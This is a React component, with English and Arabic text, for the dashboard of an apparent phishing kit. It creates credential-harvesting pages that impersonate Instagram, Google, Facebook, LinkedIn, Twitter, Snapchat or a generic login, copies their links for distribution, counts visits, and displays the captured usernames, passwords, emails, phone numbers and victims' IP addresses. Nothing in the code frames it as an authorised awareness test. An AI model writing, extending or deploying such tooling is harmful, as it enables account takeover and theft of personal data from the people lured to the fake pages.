'use client'

import { useEffect, useState } from 'react'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import {
  Plus,
  Copy,
  Eye,
  Trash2,
  ExternalLink,
  Link2,
  X,
  ChevronDown,
  ChevronUp,
  Mail,
  Lock,
  Phone,
  User,
  Globe,
  Clock,
} from 'lucide-react'
import { LocaleText } from '@/components/common/LocaleText'
import { usePreferences } from '@/context/preferences-context'

interface PhishingLink {
  id: string
  slug: string
  name: string
  template_type: string
  created_at: string
  visits: number
  submissions_count: number
}

interface Submission {
  id: string
  username?: string
  password?: string
  email?: string
  phone?: string
  ip_address?: string
  user_agent?: string
  created_at: string
}

const templates = [
  { value: 'instagram', label: { en: 'Instagram', ar: 'إنستغرام' }, icon: '📷' },
  { value: 'google', label: { en: 'Google', ar: 'جوجل' }, icon: '🔍' },
  { value: 'facebook', label: { en: 'Facebook', ar: 'فيسبوك' }, icon: '📘' },
  { value: 'linkedin', label: { en: 'LinkedIn', ar: 'لينكد إن' }, icon: '💼' },
  { value: 'twitter', label: { en: 'Twitter', ar: 'تويتر' }, icon: '🐦' },
  { value: 'snapchat', label: { en: 'Snapchat', ar: 'سناب شات' }, icon: '👻' },
  { value: 'generic', label: { en: 'Generic', ar: 'عام' }, icon: '🔗' },
]

export function PhishingSidebar() {
  const { locale } = usePreferences()
  const [isOpen, setIsOpen] = useState(true)
  const [links, setLinks] = useState<PhishingLink[]>([])
  const [loading, setLoading] = useState(true)
  const [showCreateForm, setShowCreateForm] = useState(false)
  const [selectedLink, setSelectedLink] = useState<string | null>(null)
  const [submissions, setSubmissions] = useState<Record<string, Submission[]>>({})
  const [newLink, setNewLink] = useState({
    name: '',
    slug: '',
    template_type: 'instagram',
  })

  useEffect(() => {
    loadLinks()
  }, [])

  const loadLinks = async () => {
    try {
      const res = await fetch('/api/phishing')
      if (res.ok) {
        const data = await res.json()
        setLinks(data.links || [])
      }
    } catch (error) {
      console.error('Failed to load links:', error)
    } finally {
      setLoading(false)
    }
  }

  const loadSubmissions = async (linkId: string) => {
    if (submissions[linkId]) return // Already loaded

    try {
      const res = await fetch(`/api/phishing/${linkId}`)
      if (res.ok) {
        const data = await res.json()
        setSubmissions((prev) => ({ ...prev, [linkId]: data.submissions || [] }))
      }
    } catch (error) {
      console.error('Failed to load submissions:', error)
    }
  }

  const handleCreateLink = async () => {
    if (!newLink.name || !newLink.slug || !newLink.template_type) {
      alert(locale === 'ar' ? 'يرجى ملء جميع الحقول' : 'Please fill all fields')
      return
    }

    try {
      const res = await fetch('/api/phishing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newLink),
      })

      if (res.ok) {
        setShowCreateForm(false)
        setNewLink({ name: '', slug: '', template_type: 'instagram' })
        loadLinks()
      } else {
        const data = await res.json()
        alert(data.error || (locale === 'ar' ? 'فشل إنشاء الرابط' : 'Failed to create link'))
      }
    } catch (error) {
      console.error('Failed to create link:', error)
      alert(locale === 'ar' ? 'فشل إنشاء الرابط' : 'Failed to create link')
    }
  }

  const handleDeleteLink = async (id: string) => {
    if (!confirm(locale === 'ar' ? 'هل أنت متأكد من حذف هذا الرابط؟' : 'Are you sure you want to delete this link?')) return

    try {
      const res = await fetch(`/api/phishing/${id}`, {
        method: 'DELETE',
      })

      if (res.ok) {
        loadLinks()
        if (selectedLink === id) {
          setSelectedLink(null)
        }
      } else {
        alert(locale === 'ar' ? 'فشل حذف الرابط' : 'Failed to delete link')
      }
    } catch (error) {
      console.error('Failed to delete link:', error)
      alert(locale === 'ar' ? 'فشل حذف الرابط' : 'Failed to delete link')
    }
  }

  const copyLink = (slug: string) => {
    const url = `${window.location.origin}/phishing/${slug}`
    navigator.clipboard.writeText(url)
    alert(locale === 'ar' ? 'تم نسخ الرابط!' : 'Link copied!')
  }

  const toggleLinkDetails = (linkId: string) => {
    if (selectedLink === linkId) {
      setSelectedLink(null)
    } else {
      setSelectedLink(linkId)
      loadSubmissions(linkId)
    }
  }

  const getTemplateInfo = (type: string) => {
    return templates.find((t) => t.value === type) || templates[templates.length - 1]
  }

  return (
    <Card className="h-full flex flex-col">
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <CardTitle className="text-lg font-semibold flex items-center gap-2">
            <Link2 className="h-5 w-5 text-accent" />
            <LocaleText en="Phishing Pages" ar="صفحات التصيد" />
          </CardTitle>
          <Button
            variant="ghost"
            size="sm"
            onClick={() => setIsOpen(!isOpen)}
            className="h-8 w-8 p-0"
          >
            {isOpen ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
          </Button>
        </div>
      </CardHeader>

      {isOpen && (
        <CardContent className="flex-1 overflow-y-auto space-y-4">
          {!showCreateForm ? (
            <>
              <Button
                onClick={() => setShowCreateForm(true)}
                className="w-full"
                size="sm"
              >
                <Plus className="h-4 w-4 mr-2" />
                <LocaleText en="Create New Page" ar="إنشاء صفحة جديدة" />
              </Button>

              {loading ? (
                <div className="text-center py-8 text-sm text-muted">
                  <LocaleText en="Loading..." ar="جاري التحميل..." />
                </div>
              ) : links.length === 0 ? (
                <div className="text-center py-8 text-sm text-muted">
                  <Link2 className="h-8 w-8 mx-auto mb-2 opacity-50" />
                  <p>
                    <LocaleText en="No pages yet" ar="لا توجد صفحات بعد" />
                  </p>
                </div>
              ) : (
                <div className="space-y-3">
                  {links.map((link) => {
                    const template = getTemplateInfo(link.template_type)
                    const isSelected = selectedLink === link.id
                    const linkSubmissions = submissions[link.id] || []

                    return (
                      <div
                        key={link.id}
                        className="rounded-xl border border-border/50 bg-surface/50 overflow-hidden"
                      >
                        <div className="p-3 space-y-2">
                          <div className="flex items-center justify-between">
                            <div className="flex items-center gap-2 flex-1 min-w-0">
                              <span className="text-xl">{template.icon}</span>
                              <div className="flex-1 min-w-0">
                                <p className="text-sm font-semibold text-foreground truncate">
                                  {link.name}
                                </p>
                                <p className="text-xs text-muted truncate">
                                  /phishing/{link.slug}
                                </p>
                              </div>
                            </div>
                            <Badge variant="outline" className="text-xs">
                              {template.label[locale]}
                            </Badge>
                          </div>

                          <div className="flex items-center gap-2 text-xs text-muted">
                            <div className="flex items-center gap-1">
                              <Eye className="h-3 w-3" />
                              <span>{link.visits}</span>
                            </div>
                            <div className="flex items-center gap-1">
                              <Mail className="h-3 w-3" />
                              <span>{link.submissions_count}</span>
                            </div>
                          </div>

                          <div className="flex items-center gap-1 pt-2 border-t border-border/50">
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => copyLink(link.slug)}
                              className="flex-1 h-7 text-xs"
                            >
                              <Copy className="h-3 w-3 mr-1" />
                              <LocaleText en="Copy" ar="نسخ" />
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => window.open(`/phishing/${link.slug}`, '_blank')}
                              className="flex-1 h-7 text-xs"
                            >
                              <ExternalLink className="h-3 w-3 mr-1" />
                              <LocaleText en="Open" ar="فتح" />
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => toggleLinkDetails(link.id)}
                              className="h-7 w-7 p-0"
                            >
                              {isSelected ? (
                                <ChevronUp className="h-3 w-3" />
                              ) : (
                                <ChevronDown className="h-3 w-3" />
                              )}
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => handleDeleteLink(link.id)}
                              className="h-7 w-7 p-0 text-red-400 hover:text-red-500"
                            >
                              <Trash2 className="h-3 w-3" />
                            </Button>
                          </div>
                        </div>

                        {isSelected && (
                          <div className="border-t border-border/50 bg-surface/30 p-3 space-y-3 max-h-96 overflow-y-auto">
                            <div className="flex items-center justify-between">
                              <p className="text-xs font-semibold text-foreground">
                                <LocaleText en="Submissions" ar="البيانات المدخلة" /> ({linkSubmissions.length})
                              </p>
                            </div>

                            {linkSubmissions.length === 0 ? (
                              <div className="text-center py-4 text-xs text-muted">
                                <Mail className="h-6 w-6 mx-auto mb-2 opacity-50" />
                                <p>
                                  <LocaleText en="No submissions yet" ar="لا توجد بيانات بعد" />
                                </p>
                              </div>
                            ) : (
                              <div className="space-y-2">
                                {linkSubmissions.map((submission) => (
                                  <div
                                    key={submission.id}
                                    className="rounded-lg border border-border/40 bg-surface/50 p-2 space-y-2"
                                  >
                                    <div className="flex items-center justify-between text-xs">
                                      <div className="flex items-center gap-1 text-muted">
                                        <Clock className="h-3 w-3" />
                                        <span>
                                          {new Date(submission.created_at).toLocaleString(locale === 'ar' ? 'ar-SA' : 'en-US')}
                                        </span>
                                      </div>
                                      {submission.ip_address && (
                                        <span className="text-xs text-muted">
                                          <Globe className="h-3 w-3 inline mr-1" />
                                          {submission.ip_address}
                                        </span>
                                      )}
                                    </div>

                                    <div className="grid grid-cols-2 gap-2">
                                      {submission.username && (
                                        <div className="text-xs">
                                          <div className="flex items-center gap-1 text-muted mb-1">
                                            <User className="h-3 w-3" />
                                            <LocaleText en="Username" ar="اسم المستخدم" />
                                          </div>
                                          <p className="font-mono text-foreground bg-surface-muted p-1.5 rounded text-xs break-all">
                                            {submission.username}
                                          </p>
                                        </div>
                                      )}
                                      {submission.email && (
                                        <div className="text-xs">
                                          <div className="flex items-center gap-1 text-muted mb-1">
                                            <Mail className="h-3 w-3" />
                                            <LocaleText en="Email" ar="البريد" />
                                          </div>
                                          <p className="font-mono text-foreground bg-surface-muted p-1.5 rounded text-xs break-all">
                                            {submission.email}
                                          </p>
                                        </div>
                                      )}
                                      {submission.password && (
                                        <div className="text-xs">
                                          <div className="flex items-center gap-1 text-muted mb-1">
                                            <Lock className="h-3 w-3" />
                                            <LocaleText en="Password" ar="كلمة المرور" />
                                          </div>
                                          <p className="font-mono text-foreground bg-surface-muted p-1.5 rounded text-xs break-all">
                                            {submission.password}
                                          </p>
                                        </div>
                                      )}
                                      {submission.phone && (
                                        <div className="text-xs">
                                          <div className="flex items-center gap-1 text-muted mb-1">
                                            <Phone className="h-3 w-3" />
                                            <LocaleText en="Phone" ar="الهاتف" />
                                          </div>
                                          <p className="font-mono text-foreground bg-surface-muted p-1.5 rounded text-xs break-all">
                                            {submission.phone}
                                          </p>
                                        </div>
                                      )}
                                    </div>
                                  </div>
                                ))}
                              </div>
                            )}
                          </div>
                        )}
                      </div>
                    )
                  })}
                </div>
              )}
            </>
          ) : (
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-sm font-semibold">
                  <LocaleText en="Create New Page" ar="إنشاء صفحة جديدة" />
                </h3>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => {
                    setShowCreateForm(false)
                    setNewLink({ name: '', slug: '', template_type: 'instagram' })
                  }}
                  className="h-6 w-6 p-0"
                >
                  <X className="h-4 w-4" />
                </Button>
              </div>

              <div className="space-y-3">
                <div>
                  <label className="block text-xs font-medium text-foreground mb-1.5">
                    <LocaleText en="Page Name" ar="اسم الصفحة" /> *
                  </label>
                  <input
                    type="text"
                    value={newLink.name}
                    onChange={(e) => setNewLink({ ...newLink, name: e.target.value })}
                    className="w-full px-3 py-2 rounded-lg border border-border bg-transparent text-foreground text-sm focus:outline-none focus:ring-2 focus:ring-accent/40"
                    placeholder={locale === 'ar' ? 'مثال: Instagram 1' : 'Example: Instagram 1'}
                  />
                </div>

                <div>
                  <label className="block text-xs font-medium text-foreground mb-1.5">
                    <LocaleText en="Link (Slug)" ar="الرابط" /> *
                  </label>
                  <input
                    type="text"
                    value={newLink.slug}
                    onChange={(e) => setNewLink({ ...newLink, slug: e.target.value })}
                    className="w-full px-3 py-2 rounded-lg border border-border bg-transparent text-foreground text-sm focus:outline-none focus:ring-2 focus:ring-accent/40"
                    placeholder={locale === 'ar' ? 'مثال: instagram-1' : 'Example: instagram-1'}
                  />
                  <p className="text-xs text-muted mt-1">
                    /phishing/{newLink.slug || 'slug'}
                  </p>
                </div>

                <div>
                  <label className="block text-xs font-medium text-foreground mb-1.5">
                    <LocaleText en="Template Type" ar="نوع القالب" /> *
                  </label>
                  <div className="grid grid-cols-2 gap-2">
                    {templates.map((template) => (
                      <button
                        key={template.value}
                        type="button"
                        onClick={() => setNewLink({ ...newLink, template_type: template.value })}
                        className={`p-2 rounded-lg border text-sm transition ${
                          newLink.template_type === template.value
                            ? 'border-accent/40 bg-accent/15 text-foreground'
                            : 'border-border/50 bg-surface/50 text-muted hover:text-foreground'
                        }`}
                      >
                        <div className="flex items-center gap-2">
                          <span className="text-lg">{template.icon}</span>
                          <span className="text-xs">{template.label[locale]}</span>
                        </div>
                      </button>
                    ))}
                  </div>
                </div>

                <div className="flex items-center gap-2 pt-2">
                  <Button onClick={handleCreateLink} className="flex-1" size="sm">
                    <Plus className="h-4 w-4 mr-2" />
                    <LocaleText en="Create" ar="إنشاء" />
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => {
                      setShowCreateForm(false)
                      setNewLink({ name: '', slug: '', template_type: 'instagram' })
                    }}
                    size="sm"
                  >
                    <LocaleText en="Cancel" ar="إلغاء" />
                  </Button>
                </div>
              </div>
            </div>
          )}
        </CardContent>
      )}
    </Card>
  )
}




